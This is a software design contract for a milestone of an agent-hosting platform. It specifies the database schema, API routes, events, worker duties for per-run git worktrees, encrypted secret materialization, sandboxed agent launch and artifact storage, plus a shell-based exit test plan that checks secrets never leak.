# M3 contract — workspaces, secrets, sandboxed agent launch, APM staging, artifacts

**Design contract for the M3 implementation workers.** Authoritative decisions live in
[ADR-0017](adr/ADR-0017-run-workspaces-mirrors-worktrees-and-volume-identity.md) (workspaces, mirrors,
worktrees, volume identity), [ADR-0018](adr/ADR-0018-secretref-materialization-and-envelope-encryption.md)
(secrets and `.env`), [ADR-0019](adr/ADR-0019-agent-launch-under-nono-in-required-mode.md) (launch under
nono), [ADR-0020](adr/ADR-0020-artifact-store-and-sandboxed-html-preview.md) (artifacts and preview);
this file is the *concrete surface* — tables, routes, events, worker duties and the exit test — that
three workers build against so their code cannot drift. Where this file and an ADR disagree, the ADR
wins and this file is a bug. Roadmap anchor: `communication-spec/11-build-roadmap.md` § M3. Spec
anchors: `05` (all of it), `04` § "Profile → environment → instance", `09`, `12` cases 12–17,
D-011/D-017/D-021/D-024/D-025.

M2's turn loop (`internal/worker/turnloop.go`, `internal/worker/workspace.go`), the ACP runtime
(`internal/agent/acp/`) and the journal/event machinery (ADR-0014/0016) are the substrate. M3 does not
change them; it inserts itself between "claim a turn" and "exec the adapter".

## 0. What M3 will and will NOT prove

**Will prove** (each has a scripted gate in § 7): multi-repo run workspaces on per-project mirrors with
per-run worktrees; concurrent edit isolation (case 17); an agent's *commit* reach bounded to its own ref
namespace, measured through a real nono sandbox; worker volume identity and honest loss reporting
(case 20's same-volume arm); `.env` materialization with git/artifact/log absence (case 12);
secret references, project scope, encryption at rest, metadata-only API (case 15's secret half);
`required`-mode verify-then-run abort with a visible enforcement event (case 13); APM staging pinned by
per-target lock digest, stable across a remote change (case 14); artifacts with metadata, download and
a cookie-free sandboxed HTML preview (case 16).

**Will NOT prove, and no M3 text may claim it:** tenant isolation (one Unix uid — D-025 **Open**, `05`
"Trust caveat", ADR-0019 Security); enforced network egress for a *real* model-API turn (ADR-0019
Decision 3: the `agent-turn` profile runs with egress unenforced; denial is proven on a separate
command-only profile, D-021 stays Provisional); cross-host checkpoint rehydration (D-024 stays Open;
only capture + honest loss is proven); the S3-compatible backend (contract only, no implementation —
D-014 stays Proposed); per-tenant harness credentials (ADR-0019 Decision 4 keeps them shared);
`integration_broker` delivery; resource/CPU/memory limits; rootless Podman; the "kernel lacks Landlock"
abort branch; `preapproved_within_sandbox` as a usable permission mode (it stays gated on an observed
`Verified=true` launch, ADR-0016 § 10).

## 1. Persistence

New migration `internal/store/postgres/migrations/00004_m3_workspaces_secrets_artifacts.sql`
(forward-only, ADR-0013; `ExpectedSchemaVersion()` → 4; **draft DDL below is a contract for the
migration file, not a migration**). Nothing rewrites `00001`–`00003` rows.

```sql
-- ADR-0017 D2: volume identity. Existing workers get NULL = "unknown volume",
-- which no M3 workspace may bind to.
ALTER TABLE workers ADD COLUMN volume_id     text;
ALTER TABLE workers ADD COLUMN workspace_root text;
ALTER TABLE workers ADD COLUMN sandbox_backend   text NOT NULL DEFAULT 'none';
ALTER TABLE workers ADD COLUMN sandbox_version   text;
ALTER TABLE workers ADD COLUMN sandbox_enforcement text NOT NULL DEFAULT 'disabled'
    CHECK (sandbox_enforcement IN ('required','permissive-dev','disabled'));
ALTER TABLE workers ADD COLUMN sandbox_verified  boolean NOT NULL DEFAULT false;
ALTER TABLE workers ADD COLUMN sandbox_notes     jsonb NOT NULL DEFAULT '[]'::jsonb;

CREATE TABLE workspaces (                    -- ADR-0017 D3
    id             uuid PRIMARY KEY DEFAULT uuidv7(),
    organization_id uuid NOT NULL,
    project_id     uuid NOT NULL REFERENCES projects (id),
    scope_kind     text NOT NULL CHECK (scope_kind IN ('conversation','run')),
    conversation_id uuid,                    -- set iff scope_kind='conversation'
    run_id         uuid,                     -- set iff scope_kind='run' (M4 fills)
    worker_id      uuid NOT NULL REFERENCES workers (id),
    volume_id      text NOT NULL,
    root_path      text NOT NULL,
    workspace_mode text NOT NULL DEFAULT 'worktree' CHECK (workspace_mode IN ('worktree','clone')),
    state          text NOT NULL CHECK (state IN ('preparing','ready','quarantined','released','lost')),
    created_at     timestamptz NOT NULL DEFAULT now(),
    ready_at       timestamptz, released_at timestamptz, lost_at timestamptz,
    CONSTRAINT workspaces_scope_pointer CHECK (
        (scope_kind = 'conversation' AND conversation_id IS NOT NULL AND run_id IS NULL) OR
        (scope_kind = 'run'           AND run_id          IS NOT NULL AND conversation_id IS NULL)),
    CONSTRAINT workspaces_state_timestamped CHECK (
        (state IN ('ready','quarantined','released','lost')) = (ready_at IS NOT NULL)),
    CONSTRAINT workspaces_path_absolute CHECK (root_path LIKE '/%' AND root_path NOT LIKE '%..%')
);
CREATE UNIQUE INDEX workspaces_one_live_per_conversation_idx
    ON workspaces (conversation_id) WHERE state IN ('preparing','ready','quarantined');
CREATE INDEX workspaces_worker_volume_idx ON workspaces (worker_id, volume_id, state);

CREATE TABLE workspace_repos (               -- ADR-0017 D4: the paths a policy names
    id             uuid PRIMARY KEY DEFAULT uuidv7(),
    workspace_id   uuid NOT NULL REFERENCES workspaces (id),
    repository_id  uuid NOT NULL REFERENCES repositories (id),
    checkout_path  text NOT NULL,            -- <ws>/repos/<name>
    mirror_path    text NOT NULL,            -- repos/<project>/<name>.git
    admin_dir      text NOT NULL,            -- read from `git worktree list --porcelain` (P1)
    run_ref        text NOT NULL,            -- <scope-id>/<name>
    base_commit    text NOT NULL,
    head_commit    text,
    modified_paths jsonb NOT NULL DEFAULT '[]'::jsonb,   -- manifest, exclusions applied
    excluded_paths jsonb NOT NULL DEFAULT '[]'::jsonb,   -- ADR-0017 D6 / ADR-0018 clause 3
    UNIQUE (workspace_id, repository_id)
);

CREATE TABLE secret_metadata (               -- ADR-0018 D1. NEVER a plaintext column.
    id            uuid PRIMARY KEY DEFAULT uuidv7(),
    organization_id uuid NOT NULL REFERENCES organizations (id),
    project_id    uuid REFERENCES projects (id),
    scope         text NOT NULL CHECK (scope IN ('project','org')),
    slug          text NOT NULL,
    purpose       text NOT NULL DEFAULT '',
    delivery_mode text NOT NULL CHECK (delivery_mode IN ('env','env_file','integration_broker')),
    current_version int NOT NULL DEFAULT 1 CHECK (current_version >= 1),
    allowed_agent_profile_ids uuid[] NOT NULL DEFAULT '{}',   -- empty == denied to all
    allowed_node_template_ids uuid[] NOT NULL DEFAULT '{}',
    audit_policy  text NOT NULL DEFAULT 'materialization' CHECK (audit_policy IN ('materialization','materialization_and_access')),
    created_by    uuid NOT NULL REFERENCES users (id),
    created_at    timestamptz NOT NULL DEFAULT now(),
    rotated_at    timestamptz, revoked_at timestamptz,
    CONSTRAINT secrets_scope_pointer CHECK (
        (scope = 'project' AND project_id IS NOT NULL) OR (scope = 'org' AND project_id IS NULL))
);
CREATE UNIQUE INDEX secret_metadata_project_slug_idx ON secret_metadata (project_id, slug)
    WHERE project_id IS NOT NULL;
CREATE UNIQUE INDEX secret_metadata_org_slug_idx ON secret_metadata (organization_id, slug);

CREATE TABLE secret_versions (               -- immutable, envelope-encrypted
    secret_id    uuid NOT NULL REFERENCES secret_metadata (id),
    version      int  NOT NULL CHECK (version >= 1),
    key_id       text NOT NULL,              -- master-key generation, OUTSIDE the DB (ADR-0018 D2)
    nonce        bytea NOT NULL CHECK (octet_length(nonce) = 12),
    ciphertext   bytea NOT NULL,
    aad          text  NOT NULL,             -- secret_id||version||key_id||sha256(slug)
    content_sha256 text NOT NULL,            -- retry-comparison only; never API-exposed
    created_by   uuid NOT NULL REFERENCES users (id),
    created_at   timestamptz NOT NULL DEFAULT now(),
    revoked_at   timestamptz,
    PRIMARY KEY (secret_id, version),
    CONSTRAINT secret_versions_not_empty CHECK (octet_length(ciphertext) > 0)
);

CREATE TABLE secret_mounts (                 -- 05's secret_mounts: [], declared placement
    id           uuid PRIMARY KEY DEFAULT uuidv7(),
    project_id   uuid NOT NULL REFERENCES projects (id),
    secret_id    uuid NOT NULL REFERENCES secret_metadata (id),
    delivery_mode text NOT NULL CHECK (delivery_mode IN ('env','env_file','integration_broker')),
    repository_id uuid REFERENCES repositories (id),  -- required for env_file
    relative_path text,                     -- required for env_file; relative, validated at use
    env_name     text,                      -- required for env
    key          text,                      -- single-key extraction from a multi-line value
    lifecycle    text NOT NULL DEFAULT 'turn' CHECK (lifecycle IN ('turn','workspace','node_attempt')),
    allow_tracked boolean NOT NULL DEFAULT false,     -- 05's explicit policy exception
    created_at   timestamptz NOT NULL DEFAULT now(),
    CONSTRAINT mounts_shape CHECK (
        (delivery_mode = 'env_file' AND repository_id IS NOT NULL
            AND relative_path IS NOT NULL AND relative_path NOT LIKE '/%'
            AND relative_path NOT LIKE '%..%' AND relative_path NOT LIKE '%//%'
            AND env_name IS NULL) OR
        (delivery_mode = 'env' AND env_name IS NOT NULL AND relative_path IS NULL
            AND repository_id IS NULL))
);

CREATE TABLE secret_materializations (       -- ADR-0018 D1: present-only-during-the-unit proof
    id            bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    secret_id     uuid NOT NULL REFERENCES secret_metadata (id),
    secret_version int NOT NULL,
    project_id    uuid NOT NULL REFERENCES projects (id),
    workspace_id  uuid REFERENCES workspaces (id),
    turn_id       uuid,                      -- M3's unit; attempt_id arrives with M4
    attempt_id    uuid,
    worker_id     uuid NOT NULL REFERENCES workers (id),
    delivery_mode text NOT NULL CHECK (delivery_mode IN ('env','env_file')),
    target        text NOT NULL,             -- env name or relative path
    file_mode     int,                       -- 384 == 0o600 for env_file
    materialized_at timestamptz NOT NULL DEFAULT now(),
    cleaned_at    timestamptz,
    cleaned_by    text CHECK (cleaned_by IN ('worker','reconciler','startup_sweep'))
);
CREATE INDEX secret_materializations_uncleaned_idx ON secret_materializations (workspace_id)
    WHERE cleaned_at IS NULL;

CREATE TABLE artifacts (                     -- ADR-0020 D2; bytes never in a row
    id             uuid PRIMARY KEY DEFAULT uuidv7(),
    organization_id uuid NOT NULL,
    project_id     uuid NOT NULL REFERENCES projects (id),
    run_id uuid, node_execution_id uuid, attempt_id uuid,
    conversation_id uuid, turn_id uuid, worker_id uuid,
    name           text NOT NULL,
    kind           text NOT NULL CHECK (kind IN ('markdown','image','html','json','patch','archive','checkpoint')),
    media_type     text NOT NULL,
    sha256         text NOT NULL CHECK (sha256 ~ '^[0-9a-f]{64}$'),
    size_bytes     bigint NOT NULL CHECK (size_bytes >= 0),
    storage_backend text NOT NULL CHECK (storage_backend IN ('local','s3')),
    storage_key    text NOT NULL,
    sensitivity    text NOT NULL DEFAULT 'standard'
        CHECK (sensitivity IN ('standard','internal','restricted','secret')),
    state          text NOT NULL DEFAULT 'uploading'
        CHECK (state IN ('uploading','ready','orphan','deleted')),
    redaction_count int NOT NULL DEFAULT 0,
    created_by     text NOT NULL,
    created_at     timestamptz NOT NULL DEFAULT now(),
    ready_at       timestamptz, expires_at timestamptz, deleted_at timestamptz,
    UNIQUE (project_id, kind, sha256)
);
CREATE INDEX artifacts_project_created_idx ON artifacts (project_id, created_at DESC, id DESC);
CREATE INDEX artifacts_sweep_idx ON artifacts (id) WHERE state = 'uploading';
CREATE INDEX artifacts_expiry_idx ON artifacts (expires_at, id)
    WHERE state = 'ready' AND expires_at IS NOT NULL;

-- ADR-0008/0016: agent_profiles gains the revision-ish fields M3 needs (no revisions table yet).
ALTER TABLE agent_profiles ADD COLUMN workspace_mode text NOT NULL DEFAULT 'worktree'
    CHECK (workspace_mode IN ('worktree','clone'));
ALTER TABLE agent_profiles ADD COLUMN sandbox_enforcement text NOT NULL DEFAULT 'required'
    CHECK (sandbox_enforcement IN ('required','permissive-dev','disabled'));
ALTER TABLE agent_profiles ADD COLUMN commit_granted boolean NOT NULL DEFAULT false;
ALTER TABLE agent_profiles ADD COLUMN apm_package_ref text;
ALTER TABLE agent_profiles ADD COLUMN apm_target text CHECK (apm_target IN ('claude','codex'));
ALTER TABLE agent_profiles ADD COLUMN apm_lock_digest text CHECK (apm_lock_digest IS NULL OR apm_lock_digest ~ '^sha256:[0-9a-f]{64}$');
ALTER TABLE agent_profiles ADD COLUMN secret_mount_ids uuid[] NOT NULL DEFAULT '{}';
```

CHECK constraints that must be asserted as *constraint behaviour* on a database that actually ran the
migration (ADR-0016's `migrate_test.go` pattern): `workspaces_scope_pointer`,
`workspaces_one_live_per_conversation_idx` (`23505` for a second live workspace, insertable after
`released`), `workspaces_path_absolute` (reject `..`, reject relative), `secrets_scope_pointer`
(org-with-project and project-without-org both `23514`), `secret_versions_not_empty`,
`mounts_shape` (`env` with a path and `env_file` without a repository both `23514`),
`artifacts.sha256` pattern, `artifacts` UNIQUE per `(project_id, kind, sha256)`, and
`agent_profiles.apm_lock_digest` pattern. There is deliberately **no** column anywhere that could hold
a plaintext secret, and `secret_versions.ciphertext` is unreadable from the API layer by construction
(no store method exposes it to `internal/api`).

## 2. HTTP surface

Conventions unchanged (ADR-0014): `/api/v1`, `application/problem+json`, `404` for a project-scoped
resource the caller cannot see, `X-CSRF-Token` + `Origin` on every mutation, authorization in
middleware before the handler, every list query carrying a project predicate.

| Route | Purpose / rules |
|---|---|
| `GET /api/v1/projects/{projectId}/secrets` | List **metadata only** (`id, slug, scope, purpose, delivery_mode, current_version, allowed_agent_profile_ids, revoked_at, created_at`). Never a value, never a version list beyond `current_version`. Viewer+. |
| `POST /api/v1/projects/{projectId}/secrets` | Create with `{slug, purpose, delivery_mode, allowed_agent_profile_ids, value}`. `value` is write-only: it is encrypted, stored in `secret_versions` v1, and appears in **no** response, event or log. Maintainer+. |
| `PUT /api/v1/projects/{projectId}/secrets/{secretId}` | Metadata/policy only (purpose, allowlists, audit policy). A body containing `value` is a `400` — rotation is a different verb. Maintainer+. |
| `POST /api/v1/projects/{projectId}/secrets/{secretId}/versions` | Append immutable version `{value}`; bumps `current_version`, sets `rotated_at`. The old version stays (an in-flight unit pinned it). Maintainer+. |
| `POST /api/v1/projects/{projectId}/secrets/{secretId}:revoke` | `revoked_at` on the row and all versions; later materializations refuse it (ADR-0018 D2.4). Maintainer+. |
| `GET /api/v1/projects/{projectId}/secrets/{secretId}/materializations` | Audit view: which unit, which target, when cleaned. Metadata only. Maintainer+. |
| `POST /api/v1/projects/{projectId}/secret-mounts` | Declare a mount (`05`'s YAML shape, validated by `mounts_shape` + repository existence). Maintainer+. |
| `GET /api/v1/projects/{projectId}/secret-mounts` | List declarations. Viewer+. |
| `DELETE /api/v1/projects/{projectId}/secret-mounts/{mountId}` | Remove a declaration; does not revoke the secret. Maintainer+. |
| `GET /api/v1/projects/{projectId}/workspaces` | Live + recent workspaces: `scope_kind`, `state`, `workspace_mode`, `worker_id`, `volume_id`, repos with `run_ref`/`base_commit`/`head_commit`, `excluded_paths`. **Never `root_path`/`mirror_path`/`admin_dir`** — absolute host paths are internal topology (ADR-0014's `X-Communication-Replica` precedent is the limit of what browsers learn). Viewer+. |
| `GET /api/v1/workspaces/{workspaceId}` | One workspace, same field rules, `404` from outside the project. Viewer+. |
| `GET /api/v1/workspaces/{workspaceId}/repos/{repositoryId}/status` | Worker-fed inspection: dirty summary + `modified_paths` (exclusions applied). Read from `workspace_repos`, not by shelling into the worker. Contributor+. |
| `GET /api/v1/turns/{turnId}/sandbox` | The enforcement record for one launched unit: `{stage, reason, policy_digest, backend, backend_version, verified, af_unix_mediation, network_enforced, child_started, grants[], denied_what[]}` — the turn's `workspace_id`/`worker_id` only as ids. Authorized through the turn → conversation → **project** predicate. Viewer+ (`10`'s ops/run-inspector need it, and `09` forbids an accidental worker-service surface), `404` otherwise. |
| `GET /api/v1/projects/{projectId}/artifacts` | Sensitivity-filtered list (ADR-0020 D3). Viewer+. |
| `GET /api/v1/artifacts/{artifactId}` | Metadata + `preview_url` when allowed; `storage_key` never serialized. Viewer+. |
| `GET /api/v1/artifacts/{artifactId}/content` | Streamed bytes; `text/html` served as `text/plain` + `Content-Disposition: attachment`. Contributor+ per sensitivity table. |
| `POST /api/v1/artifacts/{artifactId}/preview-token` | Mint a single-artifact, digest-bound, short-TTL token; audited as an access. Contributor+ for `standard|internal` only. |
| `GET /api/v1/system/sandbox` | Worker sandbox health for `10`'s ops page: per worker `sandbox_backend/version/enforcement/verified/notes` + the pinned nono version and policy digest. Session required, no membership (matches `GET /api/v1/workers`). |

**Deliberately absent, and a lint/test must keep it absent:** any route returning a secret value
(including "masked", "hint", "last-4" or an admin override), any route accepting a `storage_key`, any
`PUT /artifacts/{id}` (artifacts are immutable), any browser-reachable path that runs artifact script
(`…/render`, `…/view`), and any worker-service endpoint (`09`: the browser API must not accidentally
expose worker internals — the workspace inspection routes read database rows written by the worker,
never the worker).

Preview delivery is a **separate origin**, not an API route: `GET http://preview.localhost:18084/preview/{token}`
served by the same binary behind a host gate (ADR-0020 D6). `openapi.yaml` documents it as an external
URL template with a note, because putting it in `/api/v1` would imply it shares the app's cookie scope.

## 3. Event vocabulary

Names satisfy the envelope schema's `^[a-z]+(\.[a-z_]+)+$` (`api/schemas/event-envelope.schema.json`),
payload structs live in `internal/events/events.go` (one shape for control plane and worker — the
ADR-0016 rule, with `events_test.go` pinning JSON member sets and OpenAPI documentation), every
payload is an object carrying `project_id` plus the ids it correlates on, and **no payload carries a
secret value, a `.env` body, an absolute host path or a prompt** (ADR-0013 Security; `05`: "Never
include generated `.env` content in conversation logs or artifacts").

| New type | Payload members (beyond the ids in the envelope) | Emitted by / when |
|---|---|---|
| `workspace.prepared` | `workspace_id, scope_kind, conversation_id, worker_id, volume_id, workspace_mode, repos[], base_commits{}, policy_digest` | worker, once per workspace `preparing→ready` |
| `workspace.committed` | `workspace_id, repository_id, run_ref, head_commit` | worker, after a fenced post-commit ref read (ADR-0019's P8 rule: exit status alone is not proof) |
| `workspace.quarantined` | `workspace_id, reason` (`secret_left_behind, exclusion_failed, worktree_unusable`) | worker or reconciler |
| `workspace.released` | `workspace_id, repos_pruned boolean` | worker, at cleanup |
| `workspace.recovery_lost` | `workspace_id, expected_volume_id, found_volume_id, reason` (`volume_changed, path_missing, different_worker`) | worker at Prepare, or reconciler — this is case 20's honest arm |
| `sandbox.enforcement_failed` | `stage` (`probe,profile,policy_assert,grant_assert,exec,runtime`), `reason` (ADR-0019 D6 enum), `backend, backend_version, policy_digest, verified=false, child_started, detail` (bounded, redacted) | worker, before/instead of launching; **must** be followed by `conversation.turn.failed` with `reason="sandbox_enforcement_failed"` |
| `sandbox.verified` | `policy_digest, backend, backend_version, af_unix_mediation, network_enforced boolean, grants[], commit_granted boolean, verified boolean` | worker, after N-a…N-d pass — the row that makes "this turn really ran under `required`" answerable without reading worker logs |
| `secret.created` | `secret_id, slug, scope, purpose, delivery_mode, version=1, allowed_agent_profile_ids` | API (never a value) |
| `secret.version.added` | `secret_id, version, key_id, content_sha256` | API |
| `secret.policy.updated` | `secret_id, before{…}, after{…}` (allowlists, audit policy) | API |
| `secret.revoked` | `secret_id, versions[], revoked_at` | API |
| `secret.materialized` | **metadata only**: `secret_id, slug, version, delivery_mode, repository_name, relative_path|env_name, lifecycle, mode, turn_id, workspace_id, policy_digest` — and structurally no `value` member (`events_test.go` asserts the member set) | worker, immediately before/after the write |
| `secret.removed` | `secret_id, target, workspace_id, turn_id, cleaned_by` | worker / startup sweep / reconciler |
| `secret.materialization_failed` | `secret_id, slug, reason` (`path_escape, tracked_target, exists, keyring_unreadable, revoked_version, broker_unsupported, symlink_parent, mirror_writable`), `child_started boolean` | worker, before launch (fail-closed) |
| `artifact.created` | `artifact_id, name, kind, media_type, sha256, size_bytes, sensitivity, redaction_count, workspace_id, turn_id` | worker, in the same fenced transaction that flips `state='ready'` |
| `artifact.deleted` | `artifact_id, reason` (`expired, swept, retention`) | reconciler / sweep |
| `repository.mirror_updated` | `project_id, repository_id, mirror_kind, from_commit, to_commit, fetch_duration_ms` | worker (mirror create/fetch) |

Reused unchanged from M2: `conversation.turn.started|completed|cancelled|failed|interrupted`,
`conversation.tool.*`, `conversation.permission.*`, `agent.session.*`. New correlation: turn-scoped
appends additionally set `workspace_id` **only** if the envelope schema gains that optional member
(it does not today) — so until the envelope is amended (a schema-versioned change), `workspace_id`
lives inside `payload` and the journal's id columns stay as ADR-0016 left them. That is the conservative
choice and it is recorded as such.

## 4. Worker responsibilities

Ordering is normative — the assertion is *a process is never exec'd before the policy that governs it
is known good* (ADR-0009).

1. **Prepare** (ADR-0017 D1/D4): resolve volume identity (`st_dev` + root path → `workers.volume_id`),
   claim or create the `workspaces` row, create-or-fetch the **per-project** mirror,
   `git worktree add -b <scope-id>/<name>`, read the real `admin_dir` back from
   `git worktree list --porcelain` (P1), pre-create `<mirror>/logs/refs/heads/<scope-id>/` (P7),
   create `home/` 0700, persist `workspace_repos`. Any failure is a visible transcript note *and* a
   `workspaces.state` transition — M2's "clone failed, keep chatting" behaviour stays only for
   conversations that need no repository, and a `ready` workspace never silently lacks a repo.
2. **Stage APM** (ADR-0008, D-017): with `HOME=<workspace>/home` (never the worker's HOME — APM.md T4),
   `apm install --frozen --target <claude|codex>` into the run checkout, validate
   `sha256(apm.lock.yaml)` against `agent_profiles.apm_lock_digest` **per target** before launch, add
   the generated paths to `excluded_paths`, and refuse a launch on digest mismatch (case 14's stability
   test). `apm` itself is vendored at `0.33.0` (ADR-0008 D1).
3. **Materialize** (ADR-0018 D4, ordered exactly): validate → `git ls-files` check → append the path to
   `<mirror>/info/exclude` and `git check-ignore -v` confirm → `O_CREAT|O_EXCL` 0600 write →
   `secret.materialized`. `env` entries go into the launch `Env` list, which is **built from scratch**,
   never `os.Environ()` (`internal/agent/acp/runtime.go`'s fallback is the leak to close).
4. **Build the policy** (ADR-0019 D1): grants from `workspace_repos` + profile axes (`workspace_mode`,
   `commit_granted`) + `harness_credential_dirs`; abort if any path is under `/tmp`, `/var/tmp`,
   `/dev/shm` (P9/N1) or is not an absolute, `..`-free, existing path (FC3).
5. **Verify then launch** (ADR-0019 D2 N-a…N-e), then hand stdio pipes to `acp.Runtime` unchanged and
   record `sandbox.verified` / `sandbox.enforcement_failed`.
6. **Capture at the unit boundary** (ADR-0017 D8, ADR-0020 D8): dirty diff summary + modified-path
   manifest with `excluded_paths` subtracted, stored as `kind=checkpoint`/`json` artifacts — the
   *capture* only, no recoverability claim (D-024 Open).
7. **Publish artifacts**: exclusion + secret scan + `redaction_count`, `Put` bytes, then one fenced
   transaction inserting the row and `artifact.created` (ADR-0016 § 9.2: an unfenced worker may not
   publish anything).
8. **Clean up**: materialized files removed (`defer` + startup sweep over `cleaned_at IS NULL`),
   `home/` deleted, worktree removed + `prune` (WORKSPACES.md W6), `workspace.released`; a leftover
   secret file moves the workspace to `quarantined` and fails the unit.
9. **Never**: restrict the worker process itself (`05`), run `git gc` inside an attempt (ADR-0010 D6),
   write a secret to the journal/artifacts/`audit_events.detail`, or fall back to
   `permissive-dev`/`disabled` because `required` refused — that is a configured choice, not a retry.

The control plane's share of the work: secret CRUD + audit, workspace/artifact/turn-sandbox reads
(always through a project predicate), preview-token minting, the reconciler extensions for
`uploading→orphan`, uncleaned materializations and expired artifacts (one advisory-locked pass, the
ADR-0016 pattern), and readiness that reports the sandbox mode it was configured with.

## 5. Deployment surface M3 needs (so the plan below can run)

| Change | Where | Why it is required by evidence |
|---|---|---|
| Vendor `nono 0.80.0` (tarball sha256 `6da665b6…f17037f`, binary sha256 `e02d003d…eff1287d`) and `apm 0.33.0` (sha256 `e6374402…492c6b0647ae9e881f`) into the worker image | `worker/Dockerfile` | ADR-0019 D1; the image has neither today, and `doctor`/`required` must run where the agent runs |
| `worker/sandbox/profiles/communication-agent.json` + `worker/launchers.yaml` | new asset dirs (ADR-0007) | ADR-0009 D4 requires `-p <path>` over CLI flags (the built-in `default` profile is silently mixed in); `nono profile init` cannot author a path-named file (N3) |
| Landlock probe of `node:22-bookworm-slim` under Docker 29.9.0 builtin seccomp | `docs/compatibility/probes/sandbox/` rerun | ADR-0019's biggest GAP: only `debian:trixie-slim` was probed |
| Named volumes `repos` (mirror root, rw on worker only), `artifacts` (rw worker, **ro** both API replicas), `masterkeys` (ro everywhere, generated once by a one-shot), `preview-caddy` config | `compose.yml` | ADR-0017 D1 (mirrors beside workspaces, same volume), ADR-0020 (multi-replica reads), ADR-0018 D2.2 (keyring outside the DB, never an env var) |
| `COMMUNICATION_ARTIFACT_ROOT`, `COMMUNICATION_SECRET_KEYRING`, `COMMUNICATION_SANDBOX_ENFORCEMENT`, `COMMUNICATION_PREVIEW_BASE_URL`, `COMMUNICATION_PREVIEW_TOKEN_SECRET`, `COMMUNICATION_ARTIFACT_BACKEND` | worker + serve env | the above, configurable, with `disabled`/`permissive-dev` reachable only by explicit admin configuration (`05`) |
| Caddy: a second vhost `preview.localhost:18084` routing only `/preview/*`, app origin 404s everything else | `api/Caddyfile` | ADR-0020 D6; a *hostname* difference is what removes the cookie (a port would not) |
| `worker/Dockerfile`: keep `USER worker` uid 10001; `compose.harness.yml` keeps `HOST_UID`/`HOST_GID` and adds `nono` capability notes | as today | ADR-0019 D4; the observed `Authentication required` failure (ACP.md) was an unreachable-credential uid bug, and `required` must fail the same honest way |

## 6. M3 exit test plan

Lab: `docker compose -p communication -f compose.yml -f compose.harness.yml up -d --build`
(`HOST_UID=$(id -u) HOST_GID=$(id -g)`), stack at `http://localhost:18080`, preview origin
`http://preview.localhost:18084`, both API replicas + worker + `postgres:18.6`. The disposable
repositories are **local paths** (`file:///srv/m3/fixtures/{frontend,backend}.git`) — no credentials,
no network, no GitHub app (AGENTS.md: no secrets in fixtures). Every scripted check below is a shell
command whose literal output goes into the M3 acceptance report; `12-test-strategy.md`'s rule applies
verbatim: a mocked green unit test never substitutes for these.

### Setup script (`docs/compatibility/probes/m3/run.sh`, to be written as M3's first task)

```bash
S1  # fixtures: two repos, backend has app.py + tests; frontend has index.html
S2  # PROJECT A (member: alice=contributor, bob=viewer) — repos frontend+backend, profile "Claude Code"
S3  # PROJECT B (member: carol only) — repo backend-b, one workspace, one conversation, never touched
S4  # project A secret:  POST /api/v1/projects/A/secrets
    #   {slug: "test-database-url", purpose: "m3-exit", delivery_mode: "env_file",
    #    allowed_agent_profile_ids: [<claude profile>],
    #    value: "SENTINEL-m3-9f4c2a1b-database_url-for_exit_test_only"}
S5  # project A mount: {secret: test-database-url, mode: env_file, repository: backend,
    #   relative_path: .env.test.local, key: DATABASE_URL, lifecycle: turn}
S6  # project B secret + mount at the SAME relative_path, value SENTINEL-B-… — so a cross-project
    #   read that succeeded would print a value project A must never see
S7  # worker: sandbox_enforcement=required, artifact_backend=local, nono pinned
S8  # communication doctor (host and inside the worker container) → capture kernel, landlock-lsm,
    #   nono version, isolation verdict, forbidden capabilities, run-user id  → 05's first gate
```

### Case 13 — enforcement unavailable ⇒ no process, visible reason

```bash
C13a  docker compose exec worker communication doctor --sandbox-policy-dry-run   # → N-a…N-d verdict
C13b  # force it: run a throwaway worker container whose seccomp profile blocks the three
        #   landlock syscalls, so the probe really fails (NOT --security-opt seccomp=unconfined,
        #   which would do the opposite):
        docker run --rm --security-opt seccomp=prof/landlock-blocked.json … communication worker
C13c  POST a turn on a `required` profile in that container → HTTP 202 (turn queued), then:
        psql -c "select type,payload from domain_events where type='sandbox.enforcement_failed' 
                  order by global_seq desc limit 1"
        # expect: stage ∈ {probe,profile,policy_assert}, reason ∈ {landlock_unavailable,fs_unverified,
        #         af_unix_not_mediated,…}, verified=false, child_started=false
C13d  psql -c "select status,stop_reason from conversation_turns order by created_at desc limit 1"
        # expect: failed, stop_reason NULL, and the turn's failure reason = sandbox_enforcement_failed
C13e  docker compose logs worker | grep -ci "claude-agent-acp"   # expect 0: nothing ever exec'd
C13f  NEGATIVE CONTROL (the FC2 lesson): patch nothing, but assert `--sandbox-policy landlock` in the
        argv the worker logged, and that a policy requesting `external` is refused with
        reason=policy_delegation_refused
```

*Honesty note to carry into the report:* C13b is the branch SANDBOX.md/ADR-0009 list as **never
observed** ("no way to disable Landlock without sudo"). A seccomp profile blocking
`landlock_create_ruleset`/`landlock_add_rule`/`landlock_restrict_self` is the way to observe it
without sudo-in-the-test; if it cannot be made to work on this host, the case is reported **GAP**, not
PASS, and `required` keeps its GAP label exactly as ADR-0009's Migration section demands.

### Case 12 — `.env` exists only during the authorized unit, and nowhere else

```bash
C12a  # during the turn (worker writes its own observation to meta/, polled by the script):
      docker compose exec worker sh -c 'test -e \
        /workspaces/conversation/$CONV_ID/repos/backend/.env.test.local && stat -c "%a %U" …'
        # expect: 600 <worker uid>
C12b  … and the sibling project's file is NOT there:
      docker compose exec worker sh -c 'test -e /workspaces/conversation/$B_CONV_ID/repos/backend-b/.env.test.local; echo $?'  # 1
C12c  # git absence, measured inside the workspace during the turn:
      docker compose exec worker git -C …/repos/backend status --porcelain      # no `.env.test.local` line
      docker compose exec worker git -C …/repos/backend ls-files .env.test.local # empty
      docker compose exec worker git -C …/repos/backend diff -- .env.test.local  # empty
C12d  # after the turn:
      test -e …/.env.test.local; echo $?                                         # 1
      psql -c "select type,payload->>'target' from domain_events where type in
               ('secret.materialized','secret.removed') order by global_seq"
      psql -c "select cleaned_at is not null, cleaned_by from secret_materializations order by id desc limit 1"  # t | worker
C12e  # absent from OUTPUTS: grep the whole journal for the sentinel (zero rows), and audit detail:
      psql -tAc "select count(*) from domain_events where payload::text like '%SENTINEL-m3-9f4c2a1b%'"   # 0
      psql -tAc "select count(*) from audit_events  where detail::text  like '%SENTINEL-m3-9f4c2a1b%'"   # 0
C12f  # absent from ARTIFACTS: every stored object, byte-level:
      docker compose exec api-a sh -c "grep -rl SENTINEL-m3-9f4c2a1b /artifacts || echo NO_MATCH"        # NO_MATCH
      psql -tAc "select count(*) from artifacts where name like '%.env%'"                                 # 0
C12g  # absent from GIT HISTORY, the durable check (a commit is where a leak becomes permanent):
      docker compose exec worker git --git-dir=/repos/$PROJECT_ID/backend.git \
